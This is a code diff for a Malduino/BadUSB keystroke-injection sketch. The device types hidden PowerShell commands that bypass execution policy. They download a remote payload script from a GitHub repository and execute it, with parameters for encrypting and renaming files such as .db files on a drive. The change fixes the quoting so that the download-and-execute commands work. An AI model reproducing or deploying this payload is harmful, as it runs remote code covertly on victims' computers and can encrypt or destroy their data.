@@ -85,11 +85,11 @@ void setup(){
 
     // run encryption script directly from github
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type=\"single_enc\"; $file=\"test.txt\"; $file_path=\"h:\"; $show_screen=\"no\"; (New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1\") | iex}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"$type='single_enc'; $file='test.txt'; $file_path='h:'; $show_screen='no'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex\"");
     delay(defaultDelay);
     typeKey(KEY_RETURN);
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type=\"multi_ren\"; $file=\".db\"; $file_path=\"h:\"; $show_screen=\"yes\"; (New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1\") | iex}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"$type='multi_ren'; $file='.db'; $file_path='h:'; $show_screen='yes'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex\"");
     delay(defaultDelay);
     typeKey(KEY_RETURN);
     /* ----- End-Payload -----*/
